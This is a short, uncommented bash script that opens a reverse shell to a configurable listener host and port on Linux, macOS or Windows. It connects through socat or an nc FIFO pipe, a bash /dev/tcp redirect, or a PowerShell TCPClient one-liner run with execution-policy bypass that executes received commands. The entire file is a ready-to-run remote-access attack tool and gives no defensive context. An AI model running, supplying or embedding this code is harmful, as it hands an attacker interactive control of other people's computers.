#!/bin/bash

LHOST=${LHOST:-"192.168.1.15"}
LPORT=${LPORT:-"4444"}

# Detect OS and spawn shell
case "$(uname -s)" in
  Linux*)     
    # Linux: socat preferred, nc fallback
    if command -v socat >/dev/null; then
      socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT
    else
      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
    fi
    ;;
  Darwin*)    # macOS
    /bin/bash -c "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
    ;;
  CYGWIN*|MINGW*|MSYS*)  # Windows
    powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    ;;
  *) echo "Unsupported OS"; exit 1;;
esac
